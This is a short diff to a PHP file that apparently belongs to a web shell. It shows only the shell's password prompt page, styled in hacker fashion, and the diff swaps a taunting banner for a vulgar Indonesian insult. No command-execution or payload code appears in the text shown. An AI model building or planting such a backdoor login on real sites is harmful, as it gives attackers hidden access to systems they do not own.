@@ -15,7 +15,7 @@ function Login() {
   <style>html{background-color:black;color:lime;}input{background-color:transparent;box-shadow: 0 0 10px lime;color:white;border-color:white;}</style>
   <body>
   <br>
-  <h1><center></h1><br></center><center>SALAH JALAN BOSS !!!</center><br><center><form method='post'><input style='text-align:center;' type='password' name='pass'></form>
+  <h1><center></h1><br></center><center>MUKALU KAYAK KONTOL BANG !!!</center><br><center><form method='post'><input style='text-align:center;' type='password' name='pass'></form>
  ");
 }
 
